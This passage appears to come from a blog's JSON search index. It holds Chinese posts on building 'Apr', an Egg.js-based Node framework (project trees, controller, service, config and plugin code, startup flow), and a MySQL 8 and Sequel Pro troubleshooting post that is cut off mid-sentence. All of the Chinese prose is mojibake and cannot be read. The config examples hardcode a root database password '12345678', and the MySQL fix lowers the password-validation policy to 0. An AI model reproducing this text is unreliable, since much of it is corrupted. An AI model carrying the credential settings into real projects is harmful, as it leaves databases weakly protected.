â”œâ”€â”€ app â”‚ â”œâ”€â”€ controller â”‚ â”‚ â””â”€â”€ home.js â”‚ â”œâ”€â”€ public â”‚ â”œâ”€â”€ router.js â”‚ â”œâ”€â”€ service â”‚ â”‚ â””â”€â”€ code.js â”‚ â””â”€â”€ view â”‚ â””â”€â”€ home.tpl â”œâ”€â”€ config â”‚ â”œâ”€â”€ config.default.js â”‚ â””â”€â”€ plugin.js â”œâ”€â”€ logs â”‚ â””â”€â”€ apr-example â”‚ â”œâ”€â”€ apr-example-web.log â”‚ â”œâ”€â”€ common-error.log â”‚ â”œâ”€â”€ egg-agent.log â”‚ â”œâ”€â”€ egg-schedule.log â”‚ â””â”€â”€ egg-web.log â”œâ”€â”€ package-lock.json â”œâ”€â”€ package.json â”œâ”€â”€ run â”‚ â”œâ”€â”€ agent_config.json â”‚ â”œâ”€â”€ agent_config_meta.json â”‚ â”œâ”€â”€ agent_timing_57111.json â”‚ â”œâ”€â”€ application_config.json â”‚ â”œâ”€â”€ application_config_meta.json â”‚ â”œâ”€â”€ application_timing_57112.json â”‚ â””â”€â”€ router.json â””â”€â”€ test â””â”€â”€ app â””â”€â”€ controller â””â”€â”€ home.test.js (1) router.js app/router.js ç¤ºä¾‹:\nuse strict\u0026#39;; module.exports = app =\u0026gt; { app.router.get(\u0026#39;/\u0026#39;, app.controller.home.index); }; (2) controller app/controller/home.js ç¤ºä¾‹:\n\u0026#39;use strict\u0026#39;; // å¼•å…¥æ¡†æ¶ const Controller = require(\u0026#39;@lianpf/apr\u0026#39;).Controller; class HomeController extends Controller { async index() { const ctx = this.ctx; // use service defined in framework const data = await ctx.service.test.get(123); const result = await ctx.service.code.storageCustomCode(); await ctx.render(\u0026#39;home.tpl\u0026#39;, Object.assign({}, data, result)); } } module.exports = HomeController; (3) service app/service/code.js ç¤ºä¾‹:\nconst Service = require(\u0026#39;@lianpf/apr\u0026#39;).Service; class CodeService extends Service { async storageCustomCode() { // è¿æ¥dbè·å–ç”¨æˆ·æ•°æ® const result = await this.app.mysql.get(\u0026#39;custom_code\u0026#39;, { id: 11 }); // console.log(\u0026#39;--storageCustomCode-result--\u0026#39;, result) return result; } } module.exports = CodeService; (4) å…¶ä»–æ–‡ä»¶ views public configs \u0026hellip; è¯·ç›´æ¥å‚è€ƒdemo æºç ï¼Œæ¬¢è¿ starã€‚\näºŒã€APIä»‹ç»åŠç¤ºä¾‹ 1. mysql é…ç½®app/config/config.default.js é…ç½®app/config/plugin.js app/service/code.js ä½¿ç”¨ app/config/config.default.js é…ç½®mysqlä¿¡æ¯\n/** * @param {Egg.EggAppInfo} appInfo app info */ module.exports = appInfo =\u0026gt; { /** * built-in config * @type {Egg.EggAppConfig} **/ const config = exports = {}; // ç”¨äºcookieç­¾åå¯†é’¥ï¼Œåº”æ›´æ”¹ä¸ºä½ è‡ªå·±çš„ Cookie å®‰å…¨å­—ç¬¦ä¸² config.keys = appInfo.name + \u0026#39;_1617081780536_9800\u0026#39;; config.mysql = { // å•æ•°æ®åº“ä¿¡æ¯é…ç½® client: { // host host: \u0026#39;127.0.0.1\u0026#39;, // ç«¯å£å· port: \u0026#39;3306\u0026#39;, // ç”¨æˆ·å user: \u0026#39;root\u0026#39;, // å¯†ç  password: \u0026#39;12345678\u0026#39;, // æ•°æ®åº“å database: \u0026#39;localTestDB\u0026#39;, }, // æ˜¯å¦åŠ è½½åˆ° app ä¸Šï¼Œé»˜è®¤å¼€å¯ app: true, // æ˜¯å¦åŠ è½½åˆ° agent ä¸Šï¼Œé»˜è®¤å…³é—­ agent: false, }; // add your user config here const userConfig = { // myAppName: \u0026#39;egg\u0026#39;, }; return { ...config, ...userConfig, }; }; app/config/plugin.js å¼€å¯mysqlæ’ä»¶\nmodule.exports = { // å¼€å¯æ’ä»¶ mysql: true, nunjucks: true, } ä½¿ç”¨è¯¦è§ app/service/code.js æºç ç¤ºä¾‹ã€‚\n2. nunjucks é…ç½®app/config/plugin.js app/controller/home.js ä½¿ç”¨ app/config/plugin.js å¼€å¯nunjucksæ’ä»¶\nmodule.exports = { // å¼€å¯æ’ä»¶ mysql: true, nunjucks: true, } ä½¿ç”¨è¯¦è§ app/controller/home.js æºç ç¤ºä¾‹ã€‚\n3. å…¶ä»– å¾…è¡¥å……\u0026hellip;\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-aprframework-docs/","summary":"\u003cp\u003eæ•´ä¸ªå›¢é˜Ÿä¾èµ–åˆç‰ˆAprä½œä¸ºç»Ÿä¸€çš„Nodeæ–¹æ¡ˆï¼Œéšç€ä¸šåŠ¡åœºæ™¯è¶Šæ¥è¶Šä¸°å¯Œï¼Œä¸€äº›æ’ä»¶ã€middleç­‰å…¬å…±é…ç½®æˆä¸ºæœ€ä½³å®è·µåï¼Œé€æ¸ä¸‹æ²‰åˆ°Apræ¡†æ¶ä¸­ï¼Œè®©Aprè¶Šæ¥è¶Š\u0026hellip;\u003c/p\u003e","title":"Node: Apræ¡†æ¶ä½¿ç”¨æ–‡æ¡£"},{"content":"åœ¨ä½ä»£ç å¹³å°å¼€å‘è¿‡ç¨‹ï¼Œç”±äºç‰©æ–™ç®¡ç†ç³»ç»Ÿä»¥åŠNode Server ä¸­é—´å±‚çš„æ­å»ºä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå‘ç°å¾ˆå¤šé€šç”¨çš„åº“å’Œé…ç½®å¯ä»¥\u0026hellip;\nä¸€ã€èƒŒæ™¯ åœ¨ä½ä»£ç å¹³å°å¼€å‘è¿‡ç¨‹ï¼Œç”±äºç‰©æ–™ç®¡ç†ç³»ç»Ÿä»¥åŠNode Server ä¸­é—´å±‚çš„æ­å»ºä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå‘ç°å¾ˆå¤šé€šç”¨çš„åº“å’Œé…ç½®å¯ä»¥æ²‰æ·€ï¼Œå½¢æˆå¯å¤åˆ¶çš„è§£å†³æ–¹æ¡ˆã€‚æ‰€ä»¥ï¼ŒåŸºäºå¼€æºæ¡†æ¶Egg.jsï¼ˆåŸºäºKoa2ï¼‰è¿›è¡Œäº†æ‹“å±•å°è£…å½¢æˆäº†åˆç‰ˆAprã€‚\næ•´ä¸ªå›¢é˜Ÿä¾èµ–åˆç‰ˆAprä½œä¸ºç»Ÿä¸€çš„Nodeæ–¹æ¡ˆï¼Œéšç€ä¸šåŠ¡åœºæ™¯è¶Šæ¥è¶Šä¸°å¯Œï¼Œä¸€äº›æ’ä»¶ã€middleç­‰å…¬å…±é…ç½®æˆä¸ºæœ€ä½³å®è·µåï¼Œé€æ¸ä¸‹æ²‰åˆ°Apræ¡†æ¶ä¸­ï¼Œè®©Aprè¶Šæ¥è¶Šæˆç†Ÿã€‚è€Œåï¼Œä¾èµ–Aprçš„å…¶ä»–é¡¹ç›®ä»…éœ€ç®€å•çš„å‡çº§ä¸‹æ¡†æ¶çš„ç‰ˆæœ¬å³å¯äº«å—åˆ°Aprå¸¦æ¥çš„çº¢åˆ©ã€‚\nå¦‚æœä½ çš„å›¢é˜Ÿä¹Ÿåœ¨è€ƒè™‘æ­å»ºç±»ä¼¼çš„æ¡†æ¶ï¼Œé‚£ä¹ˆè¯·è€ƒè™‘å¦‚ä¸‹é—®é¢˜ï¼š\nå¦‚æœä½ çš„å›¢é˜Ÿé‡åˆ°è¿‡ï¼š ç»´æŠ¤å¾ˆå¤šä¸ªé¡¹ç›®ï¼Œæ¯ä¸ªé¡¹ç›®éƒ½éœ€è¦å¤åˆ¶æ‹·è´è¯¸å¦‚ gulpfile.js / webpack.config.js ä¹‹ç±»çš„æ–‡ä»¶ æ¯ä¸ªé¡¹ç›®éƒ½éœ€è¦ä½¿ç”¨ä¸€äº›ç›¸åŒçš„ç±»åº“ï¼Œç›¸åŒçš„é…ç½® åœ¨æ–°é¡¹ç›®ä¸­å¯¹ä¸Šé¢çš„é…ç½®åšäº†ä¸€ä¸ªä¼˜åŒ–åï¼Œå¦‚ä½•åŒæ­¥åˆ°å…¶ä»–é¡¹ç›®ï¼Ÿ å¦‚æœä½ çš„å›¢é˜Ÿéœ€è¦ï¼š ç»Ÿä¸€çš„æŠ€æœ¯é€‰å‹ï¼Œæ¯”å¦‚æ•°æ®åº“ã€æ¨¡æ¿ã€å‰ç«¯æ¡†æ¶åŠå„ç§ä¸­é—´ä»¶è®¾æ–½éƒ½éœ€è¦é€‰å‹ï¼Œè€Œæ¡†æ¶å°è£…åä¿è¯åº”ç”¨ä½¿ç”¨ä¸€å¥—æ¶æ„ ç»Ÿä¸€çš„é»˜è®¤é…ç½®ï¼Œå¼€æºç¤¾åŒºçš„é…ç½®å¯èƒ½ä¸é€‚ç”¨äºå…¬å¸ï¼Œè€Œåˆä¸å¸Œæœ›åº”ç”¨å»é…ç½® ç»Ÿä¸€çš„éƒ¨ç½²æ–¹æ¡ˆï¼Œé€šè¿‡æ¡†æ¶å’Œå¹³å°çš„åŒå‘æ§åˆ¶ï¼Œåº”ç”¨åªéœ€è¦å…³æ³¨è‡ªå·±çš„ä»£ç ï¼Œå…·ä½“æŸ¥çœ‹åº”ç”¨éƒ¨ç½² ç»Ÿä¸€çš„ä»£ç é£æ ¼ï¼Œæ¡†æ¶ä¸ä»…ä»…è§£å†³ä»£ç é‡ç”¨é—®é¢˜ï¼Œè¿˜å¯ä»¥å¯¹åº”ç”¨åšä¸€å®šçº¦æŸï¼Œä½œä¸ºä¼ä¸šæ¡†æ¶æ˜¯å¾ˆå¿…è¦çš„ã€‚Aprä¾èµ–äº Egg, Egg åœ¨ Koa åŸºç¡€ä¸Šåšäº†å¾ˆå¤šçº¦å®šï¼Œæ¡†æ¶å¯ä»¥ä½¿ç”¨ Loader è‡ªå·±å®šä¹‰ä»£ç è§„åˆ™ å¦‚æœéœ€è¦ï¼Œä»¥ä¸‹æ˜¯Aprçš„ç®€æ˜“ç‰ˆæ­å»ºè¿‡ç¨‹ï¼Œä¹Ÿè®¸å¯¹ä½ æœ‰æ‰€å¸®åŠ©:\nç¨³å®šæˆç†Ÿç‰ˆæ¶‰åŠåˆ°å…¬å¸ç›¸å…³ä¸šåŠ¡ï¼Œæ•…ä»…å­˜å†…ç½‘ä¸­ï¼Œä¸å¯¹å¤–æš´éœ²ï¼Œè¯·å‹¿ç§èŠè·å–\näºŒã€æ¡†æ¶ä¸å¤šè¿›ç¨‹ æ¡†æ¶çš„æ‰©å±•æ˜¯å’Œå¤šè¿›ç¨‹æ¨¡å‹æœ‰å…³çš„ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“å¤šè¿›ç¨‹æ¨¡å‹ï¼Œæˆ‘ä»¬éœ€è¦æ‰©å±•çš„ç±»æœ‰ Agent å’Œ Applicationã€‚\nåœ¨ Agent Worker å¯åŠ¨çš„æ—¶å€™ä¼šå®ä¾‹åŒ– Agentï¼Œè€Œåœ¨ App Worker å¯åŠ¨æ—¶ä¼šå®ä¾‹åŒ– Applicationï¼Œè¿™ä¸¤ä¸ªç±»åˆåŒæ—¶ç»§æ‰¿ EggCoreã€‚\nEggCore å¯ä»¥çœ‹åš Koa Application çš„å‡çº§ç‰ˆï¼Œé»˜è®¤å†…ç½® Loaderã€Router åŠåº”ç”¨å¼‚æ­¥å¯åŠ¨ç­‰åŠŸèƒ½ï¼Œå¯ä»¥çœ‹åšæ˜¯æ”¯æŒ Loader çš„ Koaã€‚ è€Œæˆ‘ä»¬è¦æ­å»ºçš„Apråˆ™ä¾èµ–äºEggCoreã€‚\nKoa Application ^ EggCore ^ AprCore ^ â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ Apr Agent Apr Application ^ ^ agent worker app worker ä¸‰ã€å®šåˆ¶æ¡†æ¶: Apr 1. create Apr \u0026amp; init $ mkdir apr \u0026amp;\u0026amp; cd apr $ npm init egg --type=framework $ npm i $ npm test 2. æ¡†æ¶ç»§æ‰¿ æ¡†æ¶æ”¯æŒç»§æ‰¿å…³ç³»ï¼Œå¯ä»¥æŠŠæ¡†æ¶æ¯”ä½œä¸€ä¸ªç±»ï¼ŒåŸºç±»æ˜¯ Egg æ¡†æ¶ï¼Œå®šä¹‰ä¸€ä¸ªæ¡†æ¶éœ€è¦ç»§æ‰¿äºEggä¸”å®ç° Egg æ‰€æœ‰çš„ APIã€‚\n// package.json { \u0026#34;name\u0026#34;: \u0026#34;apr\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;egg\u0026#34;: \u0026#34;^2.0.0\u0026#34; } } // index.js module.exports = require(\u0026#39;./lib/framework.js\u0026#39;); // lib/framework.js const path = require(\u0026#39;path\u0026#39;); const egg = require(\u0026#39;egg\u0026#39;); const EGG_PATH = Symbol.for(\u0026#39;egg#eggPath\u0026#39;); class Application extends egg.Application { get [EGG_PATH]() { // è¿”å› framework è·¯å¾„ return path.dirname(__dirname); } } // è¦†ç›–äº† Egg çš„ Application module.exports = Object.assign(egg, { Application, }); åº”ç”¨å¯åŠ¨æ—¶éœ€è¦æŒ‡å®šæ¡†æ¶åï¼ˆåœ¨ package.json æŒ‡å®š egg.frameworkï¼Œé»˜è®¤ä¸º eggï¼‰ï¼ŒLoader å°†ä» node_modules æ‰¾æŒ‡å®šæ¨¡å—ä½œä¸ºæ¡†æ¶ï¼Œå¹¶åŠ è½½å…¶ export çš„ Application\n{ \u0026#34;scripts\u0026#34;: { \u0026#34;dev\u0026#34;: \u0026#34;egg-bin dev\u0026#34; }, \u0026#34;egg\u0026#34;: { \u0026#34;framework\u0026#34;: \u0026#34;apr\u0026#34; } } ç°åœ¨ apr æ¡†æ¶ç›®å½•å·²ç»æ˜¯ä¸€ä¸ª loadUnitï¼Œé‚£ä¹ˆç›¸åº”ç›®å½•å’Œæ–‡ä»¶ï¼ˆå¦‚ app å’Œ configï¼‰éƒ½ä¼šè¢«åŠ è½½\n3. è‡ªå®šä¹‰ Agent ä¸Šé¢çš„ä¾‹å­è‡ªå®šä¹‰äº† Applicationï¼Œå› ä¸º Egg æ˜¯å¤šè¿›ç¨‹æ¨¡å‹ï¼Œæ‰€ä»¥è¿˜éœ€è¦å®šä¹‰ Agentï¼ŒåŸç†æ˜¯ä¸€æ ·çš„\n// lib/framework.js const path = require(\u0026#39;path\u0026#39;); const egg = require(\u0026#39;egg\u0026#39;); const EGG_PATH = Symbol.for(\u0026#39;egg#eggPath\u0026#39;); class Application extends egg.Application { get [EGG_PATH]() { // è¿”å› framework è·¯å¾„ return path.dirname(__dirname); } } class Agent extends egg.Agent { get [EGG_PATH]() { return path.dirname(__dirname); } } // è¦†ç›–äº† Egg çš„ Application module.exports = Object.assign(egg, { Application, Agent, }); ä½†å› ä¸º Agent å’Œ Application æ˜¯ä¸¤ä¸ªå®ä¾‹ï¼Œæ‰€ä»¥ API æœ‰å¯èƒ½ä¸ä¸€è‡´\n4. è‡ªå®šä¹‰ Loader Loader åº”ç”¨å¯åŠ¨çš„æ ¸å¿ƒï¼Œä½¿ç”¨å®ƒè¿˜èƒ½è§„èŒƒåº”ç”¨ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºè¿™ä¸ªç±»æ‰©å±•æ›´å¤šåŠŸèƒ½ï¼Œæ¯”å¦‚åŠ è½½æ•°æ®ä»£ç ã€‚\næ‰©å±• Loader è¿˜èƒ½è¦†ç›–é»˜è®¤çš„å®ç°ï¼Œæˆ–è°ƒæ•´ç°æœ‰çš„åŠ è½½é¡ºåºç­‰\nè‡ªå®šä¹‰ Loader ä¹Ÿæ˜¯ç”¨ Symbol.for(\u0026rsquo;egg#loader\u0026rsquo;) çš„æ–¹å¼ï¼Œä¸»è¦çš„åŸå› è¿˜æ˜¯ä½¿ç”¨åŸå‹é“¾\n// lib/framework.js const path = require(\u0026#39;path\u0026#39;); const egg = require(\u0026#39;egg\u0026#39;); const EGG_PATH = Symbol.for(\u0026#39;egg#eggPath\u0026#39;); class AppWorkerLoader extends egg.AppWorkerLoader { load() { super.load(); // è‡ªå·±æ‰©å±• } } class Application extends egg.Application { get [EGG_PATH]() { // è¿”å› framework è·¯å¾„ return path.dirname(__dirname); } // è¦†ç›– Egg çš„ Loaderï¼Œå¯åŠ¨æ—¶ä½¿ç”¨è¿™ä¸ª Loader get [EGG_LOADER]() { return AppWorkerLoader; } } // è¦†ç›–äº† Egg çš„ Application module.exports = Object.assign(egg, { Application, // è‡ªå®šä¹‰çš„ Loader ä¹Ÿéœ€è¦ exportï¼Œä¸Šå±‚æ¡†æ¶éœ€è¦åŸºäºè¿™ä¸ªæ‰©å±• AppWorkerLoader: AppWorkerLoader, }); AgentWorkerLoader æ‰©å±•ä¹Ÿç±»ä¼¼ï¼Œè¿™é‡Œä¸å†ä¸¾ä¾‹\nAgentWorkerLoader åŠ è½½çš„æ–‡ä»¶å¯ä»¥äº AppWorkerLoader ä¸åŒï¼Œæ¯”å¦‚ï¼šé»˜è®¤åŠ è½½æ—¶ï¼ŒEgg çš„ AppWorkerLoader ä¼šåŠ è½½ app.js è€Œ AgentWorkerLoader åŠ è½½çš„æ˜¯ agent.jsã€‚\n5. æ‹“å±•å…¶ä»–åŠŸèƒ½ ä½ è¿˜å¯ä»¥è‡ªå·±å»ä¸°å¯Œpluginsã€middleç­‰å„ç§å„æ ·çš„åŠŸèƒ½ç‰¹æ•ˆï¼Œè®©ä½ çš„ApråŠŸèƒ½å˜å¾—å˜å¾—è¶Šæ¥è¶Šå¼ºå¤§ï¼Œæ­¤å¤„ä»¥pluginsä¸ºä¾‹ã€‚\nå†…ç½® nunjucks æ¥æä¾›æœåŠ¡ç«¯æ¨¡æ¿æ¸²æŸ“èƒ½åŠ› å°è£… egg-mysql // Apr æ¡†æ¶é…ç½® // package.json { \u0026#34;name\u0026#34;: \u0026#34;apr\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;egg-mysql\u0026#34;: \u0026#34;^3.0.0\u0026#34;, \u0026#34;egg-view-nunjucks\u0026#34;: \u0026#34;^2.0.0\u0026#34; } } // config/plugin.js /** * @desc: framework é›†æˆå„ç§ plugins * @path: \u0026#39;config/plugin.js\u0026#39; * */ module.exports = { // mysql mysql: { enable: false, package: \u0026#39;egg-mysql\u0026#39;, }, // add you build-in plugin here, example: nunjucks: { enable: false, package: \u0026#39;egg-view-nunjucks\u0026#39;, } } ä½¿ç”¨Aprçš„åº”ç”¨é…ç½®:\n// åº”ç”¨é…ç½® // package.json { \u0026#34;dependencies\u0026#34;: { \u0026#34;apr\u0026#34;: \u0026#34;^1.0.0\u0026#34;, } } // config/plugin.js module.exports = { // å¼€å¯æ’ä»¶ mysql: true, nunjucks: true, } åœ¨æ¡†æ¶çš„åŸºç¡€ä¸Šè¿˜å¯ä»¥æ‰©å±•å‡ºæ–°çš„æ¡†æ¶ï¼Œä¹Ÿå°±æ˜¯è¯´æ¡†æ¶æ˜¯å¯ä»¥æ— é™çº§ç»§æ‰¿çš„ï¼Œæœ‰ç‚¹åƒç±»çš„ç»§æ‰¿\n+-----------------------------------+--------+ | app1, app2, app3, app4 | | +-----+--------------+--------------+ | | | | framework2 | | + | Apr +--------------+ plugin | | | | framework1 | | + +--------------+--------------+ | | Egg | | +-----------------------------------+--------| | Koa | +-----------------------------------+--------+ å››ã€å•å…ƒæµ‹è¯• å¾…è¡¥å……\u0026hellip;\nå¯ å‚è€ƒ\näº”ã€æ¡†æ¶å¯åŠ¨åŸç† startCluster å¯åŠ¨ä¼ å…¥ baseDir å’Œ frameworkï¼ŒMaster è¿›ç¨‹å¯åŠ¨ Master å…ˆ fork Agent Worker æ ¹æ® framework æ‰¾åˆ°æ¡†æ¶ç›®å½•ï¼Œå®ä¾‹åŒ–è¯¥æ¡†æ¶çš„ Agent ç±» Agent æ‰¾åˆ°å®šä¹‰çš„ AgentWorkerLoaderï¼Œå¼€å§‹è¿›è¡ŒåŠ è½½ AgentWorkerLoaderï¼Œå¼€å§‹è¿›è¡ŒåŠ è½½ æ•´ä¸ªåŠ è½½è¿‡ç¨‹æ˜¯åŒæ­¥çš„ï¼ŒæŒ‰ plugin \u0026gt; config \u0026gt; extend \u0026gt; agent.js \u0026gt; å…¶ä»–æ–‡ä»¶é¡ºåºåŠ è½½ agent.js å¯è‡ªå®šä¹‰åˆå§‹åŒ–ï¼Œæ”¯æŒå¼‚æ­¥å¯åŠ¨ï¼Œå¦‚æœå®šä¹‰äº† beforeStart ä¼šç­‰å¾…æ‰§è¡Œå®Œæˆä¹‹åé€šçŸ¥ Master å¯åŠ¨å®Œæˆã€‚ Master å¾—åˆ° Agent Worker å¯åŠ¨æˆåŠŸçš„æ¶ˆæ¯ï¼Œä½¿ç”¨ cluster fork App Worker App Worker æœ‰å¤šä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥è¿™å‡ ä¸ªè¿›ç¨‹æ˜¯å¹¶è¡Œå¯åŠ¨çš„ï¼Œä½†æ‰§è¡Œé€»è¾‘æ˜¯ä¸€è‡´çš„ å•ä¸ª App Worker å’Œ Agent ç±»ä¼¼ï¼Œé€šè¿‡ framework æ‰¾åˆ°æ¡†æ¶ç›®å½•ï¼Œå®ä¾‹åŒ–è¯¥æ¡†æ¶çš„ Application ç±» Application æ‰¾åˆ° AppWorkerLoaderï¼Œå¼€å§‹è¿›è¡ŒåŠ è½½ï¼Œé¡ºåºä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œä¼šå¼‚æ­¥ç­‰å¾…ï¼Œå®Œæˆåé€šçŸ¥ Master å¯åŠ¨å®Œæˆ Master ç­‰å¾…å¤šä¸ª App Worker çš„æˆåŠŸæ¶ˆæ¯åå¯åŠ¨å®Œæˆï¼Œèƒ½å¯¹å¤–æä¾›æœåŠ¡ å…­ã€Aprç»“æ„ Apr â”œâ”€â”€ README.md â”œâ”€â”€ app â”‚ â”œâ”€â”€ extend â”‚ â”‚ â”œâ”€â”€ application.js â”‚ â”‚ â””â”€â”€ context.js â”‚ â””â”€â”€ service â”‚ â””â”€â”€ test.js â”œâ”€â”€ config â”‚ â”œâ”€â”€ config.default.js â”‚ â””â”€â”€ plugin.js â”œâ”€â”€ index.js â”œâ”€â”€ lib â”‚ â””â”€â”€ framework.js â”œâ”€â”€ package-lock.json â”œâ”€â”€ package.json â””â”€â”€ test â”œâ”€â”€ fixtures â”‚ â””â”€â”€ example â”‚ â”œâ”€â”€ app â”‚ â”‚ â”œâ”€â”€ controller â”‚ â”‚ â”‚ â””â”€â”€ home.js â”‚ â”‚ â””â”€â”€ router.js â”‚ â”œâ”€â”€ config â”‚ â”‚ â””â”€â”€ config.default.js â”‚ â””â”€â”€ package.json â””â”€â”€ framework.test.js å¼•ç”¨ç¤ºä¾‹ demoæºç ä»“åº“ï¼Œæ¬¢è¿ starã€‚\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-aprframework-develop/","summary":"\u003cp\u003eåœ¨ä½ä»£ç å¹³å°å¼€å‘è¿‡ç¨‹ï¼Œç”±äºç‰©æ–™ç®¡ç†ç³»ç»Ÿä»¥åŠNode Server ä¸­é—´å±‚çš„æ­å»ºä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå‘ç°å¾ˆå¤šé€šç”¨çš„åº“å’Œé…ç½®å¯ä»¥\u0026hellip;\u003c/p\u003e","title":"Node: Apræ¡†æ¶å¼€å‘"},{"content":"å¼€å‘é¡¹ç›®ç”µè„‘ä¸­è£…ä¸Šäº†mysql8.0æ•°æ®åº“ï¼Œåœ¨ä½¿ç”¨æ•°æ®åº“æ—¶é‡è§æœªçŸ¥çš„æ„å¤–é”™è¯¯ï¼Œä¸‹é¢æ¥è®°å½•ä¸‹é—®é¢˜è§£å†³çš„è¿‡ç¨‹\u0026hellip;\nä¸€ã€Node.js mysql 1ã€Node.js mysqlå®¢æˆ·ç«¯ä¸æ”¯æŒè®¤è¯åè®® é—®é¢˜æè¿°: è§£å†³Node.js mysqlå®¢æˆ·ç«¯ä¸æ”¯æŒè®¤è¯åè®®å¼•å‘çš„â€œER_NOT_SUPPORTED_AUTH_MODEâ€é—®é¢˜\né—®é¢˜åŸå› :\nNodeæœ€æ–°çš„mysqlæ¨¡å—å¹¶æœªå®Œå…¨æ”¯æŒMySQL 8çš„â€œcaching_sha2_passwordâ€åŠ å¯†æ–¹å¼ â€œcaching_sha2_passwordâ€åœ¨MySQL 8ä¸­æ˜¯é»˜è®¤çš„åŠ å¯†æ–¹å¼ å› æ­¤ï¼Œåœ¨ä½ åˆå§‹åŒ– MYSQL 8.0 ä½¿ç”¨ validate_password_policy å®‰å…¨è®¾ç½®å‘å¯¼ï¼Œ(é»˜è®¤)é€‰æ‹©çš„ MIDDLE çº§åˆ«çš„åŠ å¯†æ–¹å¼ã€‚ä½†æ˜¯nodeçš„mysqlæ¨¡å—ä»…æ”¯æŒ LOWçº§åˆ«ï¼Œæ‰€ä»¥è¯¥è´¦å·ã€å¯†ç æ— æ³•åœ¨mysqlæ¨¡å—ä¸­ä½¿ç”¨\né—®é¢˜è§£å†³ï¼š\nä¿®æ”¹ç”¨æˆ·rootçš„å¯†ç ï¼Œå¹¶æŒ‡å®šmysqlæ¨¡å—èƒ½å¤Ÿæ”¯æŒçš„åŠ å¯†æ–¹å¼\n~\u0026gt; mysql -u root -p mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;validate_password%\u0026#39;; mysql\u0026gt; set global validate_password.policy=0; mysql\u0026gt; ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;8ä½å¯†ç \u0026#39;; äºŒã€Sequel Pro åœ¨é€‰ç”¨æ•°æ®åº“å¯è§†åŒ–å·¥å…·æ¥è¿æ¥æ•°æ®åº“æ—¶é‡è§æœªçŸ¥çš„æ„å¤–é”™è¯¯\n1ã€è§£å†³MAC:Sequel Pro encountered an unexpected error é—®é¢˜ é—®é¢˜æè¿°ï¼šè¿æ¥å‡ºç°Sequel Pro encountered an unexpected error\né—®é¢˜æè¿°\nåšä¸»é…ç½®ç¯å¢ƒ\nthe latest version of mac os Mojave 10.14 mysql 8.0 ä¸‹è½½çš„æœ€æ–°Sequel Pro 1.1.2 ï¼Œè¿æ¥ä¸Šæ•°æ®åº“ mysql 8.0ï¼Œæ¯æ¬¡é€‰ä¸­å·¦ä¸Šè§’çš„æ•°æ®åº“è¡¨æ—¶ï¼Œé€‰åº“ï¼Œé€‰è¡¨å°±æŠ¥é”™ï¼Œå°±å‡ºç°äº†ä¸Šè¾¹çš„æƒ…å†µ\né—®é¢˜è§£å†³:\né¦–å…ˆå°è¯•é‡è£…ï¼Œæ€€ç–‘å®‰è£…Sequel Pro æ—¶å°‘äº†ä»€ä¹ˆä¸œè¥¿ï¼Œé—®é¢˜ä¾æ—§ã€‚ æ¢ç”¨ Sequel Pro 1.1.1 è¿˜æ˜¯å‡ºç°åŒæ ·é—®é¢˜ã€‚æ’é™¤Sequel Proç‰ˆæœ¬é—®é¢˜ mac os ç‰ˆæœ¬æˆ–è€…æ•°æ®åº“ç‰ˆæœ¬é—®é¢˜ é’ˆå¯¹ç¬¬ä¸‰ç§æƒ…å†µï¼Œè¿›è¡ŒæŸ¥æ‰¾ï¼ŒæŸ¥åˆ°: å¯¹äº MySQL 8.0åŠä»¥ä¸Šæ¥è¯´ï¼Œç›®å‰å‘å¸ƒçš„ç‰ˆæœ¬1.1.2è¿æ¥çš„æ—¶å€™å¯èƒ½ä¼šå´©æºƒé€€å‡ºã€‚\nçœ‹ä¸‹å®˜æ–¹çš„è§£é‡Šï¼š\nFixed 100% working. Previously Sequel pro had problems with the latest version of mac os Mojave 10.14 and mysql 8.0, to ensure sequel pro works fine during the whole process of development you need to download Sequel pro Test build version here: https://sequelpro.com/test-builds\né‡è§è¿™ç§mysqlç‰ˆæœ¬çš„é—®é¢˜ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½çš„åŠæ³•ï¼Œä½¿ç”¨test 